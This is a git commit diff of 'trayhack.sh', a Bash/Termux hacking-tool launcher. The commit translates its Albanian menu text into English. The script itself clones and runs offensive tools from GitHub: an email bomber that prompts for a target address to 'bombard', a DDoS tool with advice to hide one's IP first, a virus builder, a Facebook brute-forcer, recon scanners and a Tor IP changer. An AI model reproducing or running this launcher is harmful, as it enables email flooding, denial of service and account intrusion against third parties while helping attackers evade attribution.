d3dfaf1a58fcec42dc16d175c44525fc937c6ccb
iHavebraincells <rizzbash32@gmail.com>
2025-08-10 20:04:42 -0400

    Update trayhack.sh

--- trayhack.sh
+++ trayhack.sh
@@ -25,14 +25,14 @@ echo -e '\033[31;40;1m
 '
 
 
-#Zgjedhja e Opsionit
+#Option Selection
 
 
-read -p "Numri i transaksionit: " islem
+read -p "Transaction number: " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
 clear
 
-echo -e "\033[47;31;5m Po instalon përditësimin dhe kërkesat...\033[0m"
+echo -e "\033[47;31;5m Installing update and requirements...\033[0m"
 sleep 5
 pkg install git -y
 pkg install python python3 -y
@@ -41,7 +41,7 @@ pkg install curl -y
 apt update
 apt upgrade -y
 clear
-echo -e "\033[47;3;35m Përditësimi i plotë...\033[0m"
+echo -e "\033[47;3;35m Full update...\033[0m"
 sleep 3
 bash trayhack.sh
 
@@ -82,39 +82,39 @@ cd fast-mail-bomber/
 mv config.example.php config.php
 php index.php update-providers
 rm -rf data/nodes.json data/dead_providers.json
-echo -e "\033[47;3;35m Ky instalim do tju marre shum kohe\033[0m"
-echo -e "\033[47;3;35m Per te ndaluar shtypni Ctrl+C\033[0m"
+echo -e "\033[47;3;35m This installation will take a long time.\033[0m"
+echo -e "\033[47;3;35m To stop press Ctrl+C\033[0m"
 sleep 4
 php index.php update-nodes
 php index.php refine-nodes
 echo "-------------------------"
-read -p "Jepni nje adres emaili per te bombarduar: " mail
+read -p "Enter an email address to bombard.: " mail
 echo "-------------------------"
 php index.php start-bombing $mail
 
 elif [[ $islem == 6 || $islem == 06 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/palahsu/DDoS-Ripper.git
 cd DDoS-Ripper
 python3 DRipper.py
 echo ""
-echo -e "\033[47;3;35m Para se ta perdorni fshihni ip-n tuaj\033[0m"
+echo -e "\033[47;3;35m Before using it, hide your IP.\033[0m"
 
 elif [[ $islem == 7 || $islem == 07 ]]; then
 clear
 echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
 python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
 sleep 10
-echo "Prisni 10 sekonda"
+echo "Wait 10 seconds."
 bash trayhack.sh
 
  
 elif [[ $islem == 8 || $islem == 08 ]]; then
 clear
-echo -e "\033[47;3;35m PO HIQEN PROGRAMET E SHKARKUARA...\033[0m"
+echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
 sleep 3 
 rm -rf Tools
 
@@ -122,7 +122,7 @@ bash trayhack.sh
 
 elif [[ $islem == 9 || $islem == 09 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 apt update
@@ -133,7 +133,7 @@ bash trackip
 
 elif [[ $islem == 10 || $islem == 010 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/BullsEye0/dorks-eye.git
@@ -143,7 +143,7 @@ python3 dorks-eye.py
 
 elif [[ $islem == 11 || $islem == 011 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 apt update && apt upgrade && apt install git && apt install python2
@@ -154,7 +154,7 @@ python2 hackerpro.py
 
 elif [[ $islem == 12 || $islem == 012 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Tuhinshubhra/RED_HAWK
@@ -163,7 +163,7 @@ php rhawk.php
 
 elif [[ $islem == 13 || $islem == 013 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/Devil-Tigers/TigerVirus
@@ -175,7 +175,7 @@ bash app.sh
 
 elif [[ $islem == 14 || $islem == 014 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 pkg install curl -y
@@ -187,7 +187,7 @@ bash info.sh
 
 elif [[ $islem == 15 || $islem == 015 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 sudo apt-get update
@@ -201,7 +201,7 @@ sudo php BadMod.php
 
 elif [[ $islem == 16 || $islem == 016 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 git clone https://github.com/fu8uk1/facebash
@@ -213,7 +213,7 @@ sudo ./facebash.sh
 
 elif [[ $islem == 17 || $islem == 017 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
 sleep 3
 cd Tools
 pkg install git
@@ -227,22 +227,23 @@ python2 darkarmy.py
 
 elif [[ $islem == 18 || $islem == 018 ]]; then
 clear
-echo -e "\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m"
-echo -e "\033[47;3;35m Ky tool do tju kerkoje te jeni (ROOT)\033[0m"
+echo -e "\033[47;3;35m installing may take time\033[0m"
+echo -e "\033[47;3;35m 
+This tool will require you to be (ROOT)\033[0m"
 sleep 3
 cd Tools
 sudo apt-get install tor
 pip3 install requests
 git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
 cd Auto_Tor_IP_changer
-echo -e "\033[47;3;35m shkoni te shfletuesi juaj / ndryshoni përfaqësuesin (sock proxy) në 127.0.0.1:9050\033[0m"
+echo -e "\033[47;3;35m go to your browser / change the proxy (sock proxy) to 127.0.0.1:9050\033[0m"
 sleep 8
 python3 install.py
 aut
 
 else   
 	clear
-        echo -e '\033[36;40;1m Keni futur kodin e gabuar'	
+        echo -e '\033[36;40;1m You entered the wrong code.'	
 	sleep 1
 	clear 
 	bash trayhack.sh
